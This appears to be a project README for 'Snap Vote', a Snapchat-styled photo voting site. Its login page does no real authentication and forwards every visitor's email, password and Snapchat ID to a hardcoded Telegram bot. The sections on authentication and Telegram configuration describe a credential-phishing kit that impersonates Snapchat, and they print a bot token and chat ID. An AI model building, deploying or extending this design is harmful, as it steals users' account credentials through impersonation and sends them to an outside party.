# Snap Vote

## Overview

Snap Vote is a social voting platform inspired by Snapchat where users can share photos ("snaps"), receive votes from the community, and compete on leaderboards. The application features a Snapchat-themed design with yellow branding, emoji elements, and an engaging user interface for photo sharing and voting competitions.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Static Single-Page Application**
- Built with vanilla JavaScript, HTML, and CSS - no frameworks or build tools required
- Client-side rendering using native DOM manipulation
- Hash-based navigation (#home, #participate, #photos, etc.) for smooth scrolling between sections
- In-memory data storage using JavaScript arrays for snap content (votes, images, usernames)
- Responsive design with mobile-first approach

**Styling Strategy**
- Custom CSS with Snapchat-inspired color scheme (yellow: #FFFC00, black, white)
- Font Awesome icons for visual elements
- CSS animations for floating emojis and interactive effects
- Fixed header navigation with blur effect backdrop
- Gradient backgrounds and modern UI patterns

### Backend Architecture

**Python HTTP Server**
- Simple Python 3 HTTP server (`server.py`) running on port 5000
- Serves static files (HTML, CSS, JS, images)
- Handles POST requests for Telegram notifications
- No-cache headers for development purposes
- CORS enabled for cross-origin requests

**Data Flow**
- Frontend captures login/interaction data
- Data sent via POST to `/send-telegram` endpoint
- Backend formats and forwards to Telegram Bot API
- No database - credentials sent directly to Telegram for monitoring

### Authentication & Security

**Login System**
- Email/password login form with client-side validation
- Optional Snapchat ID verification field
- Login attempts are NOT authenticated - they are captured and sent to admin via Telegram
- No actual user authentication or session management implemented
- LocalStorage used for tracking login attempts in admin dashboard

**Admin Monitoring**
- Separate admin dashboard (admin.html) for viewing login attempts
- Real-time tracking of login activity
- Displays total attempts, success rates, and detailed logs
- Dark theme UI with yellow accents matching brand colors

### External Dependencies

**Third-Party Services**
- **Telegram Bot API**: Primary notification system for login attempt monitoring
  - Bot token and chat ID hardcoded in server.py for portability across domains
  - Sends formatted HTML messages with ALL user input (email, password, Snapchat ID)
  - Works on any domain (Replit or custom) as long as internet access is available
  - Used for real-time admin alerts
  
- **Font Awesome CDN**: Icon library (v6.4.0)
  - Loaded from cdnjs.cloudflare.com
  - Used throughout UI for icons (user, camera, etc.)

**Telegram Configuration** (Updated: 2025-10-15)
- `TELEGRAM_BOT_TOKEN`: `8224762003:AAFYfOn0Zh3Q9LkzpXuREVE4gqqh1WHUvfg` (hardcoded in server.py)
- `TELEGRAM_CHAT_ID`: `6711357280` (hardcoded in server.py)
- **All login details are sent**: Email/User ID, Password, Snapchat ID, Login Type, Timestamp
- **Works offline/online**: Functions on any hosting platform with internet connectivity

**Static Assets**
- Stock images stored in `attached_assets/stock_images/` directory
- Favicon from `extracted_assets/snapchat.com-542/favicons/`
- Background slideshow images for login page
- Pre-populated snap images for demo content

**No Database**
- All snap data is hardcoded in JavaScript arrays
- No persistence layer - data resets on page reload
- Login attempts stored temporarily in browser localStorage
- Vote counts are in-memory only